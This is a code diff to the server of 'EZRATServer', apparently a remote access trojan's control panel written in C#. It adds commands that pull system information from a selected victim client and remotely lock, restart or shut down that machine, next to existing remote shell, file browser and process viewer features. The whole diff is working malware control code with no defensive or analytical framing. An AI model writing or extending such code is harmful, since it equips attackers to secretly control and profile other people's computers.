@@ -34,6 +34,7 @@ namespace EZRATServer
         Chat cht;
         ProcessViewer pc;
         ShellCommand cmd;
+        SystemDetails sys;
 
 
         Timer tmr = new Timer();
@@ -289,6 +290,7 @@ namespace EZRATServer
             this.FormClosing += CloseProgram;
             tmr.Tick += UpdateClient;
             this.imageContextMenu1.ItemClicked += RightClickSelect;
+            (this.imageContextMenu1.Items[6] as ToolStripMenuItem).DropDownItemClicked += RightClickSelect;
 
 
         }
@@ -296,7 +298,6 @@ namespace EZRATServer
 
         void RightClickSelect(object sender, ToolStripItemClickedEventArgs e)
         {
-
             switch (e.ClickedItem.Text)
             {
                 case "File Browser":
@@ -321,6 +322,20 @@ namespace EZRATServer
                 case "Shell":
                     cmd = new ShellCommand(this, "C:\\" , this.lstClients.SelectedIndices[0]);
                     cmd.Show();
+                    break;
+                case "System Info":
+                    sys = new SystemDetails();
+                    sys.Show();
+                    SendCommand("sysinfo;", this.lstClients.SelectedIndices[0]);
+                    break;
+                case "Lock":
+                    SendCommand("control;0", this.lstClients.SelectedIndices[0]);
+                    break;
+                case "Restart":
+                    SendCommand("control;1", this.lstClients.SelectedIndices[0]);
+                    break;
+                case "Shutdown":
+                    SendCommand("control;2", this.lstClients.SelectedIndices[0]);
                     break;
                 default:
                     break;
@@ -363,7 +378,7 @@ namespace EZRATServer
 
         void StartServer(object sender, EventArgs e)
         {
-            Forms.Starting portDialog = new Forms.Starting();
+            Starting portDialog = new Starting();
             portDialog.ShowDialog();
             this._port = portDialog.Port;
             tmr.Interval = 500;
@@ -696,6 +711,13 @@ namespace EZRATServer
                         string[] lines = text.Split(';');
                         cmd.Path = lines[0];
                         cmd.AddResultLine(lines[1]);
+                    }
+                    else if (text.StartsWith("sysinfo;"))
+                    {
+                        text = text.Substring(8);
+                        string[] lines = text.Split('¦');
+                        sys.Invoke(new MethodInvoker(() => { sys.UpdateData(lines); }));
+
                     }
                 }
 
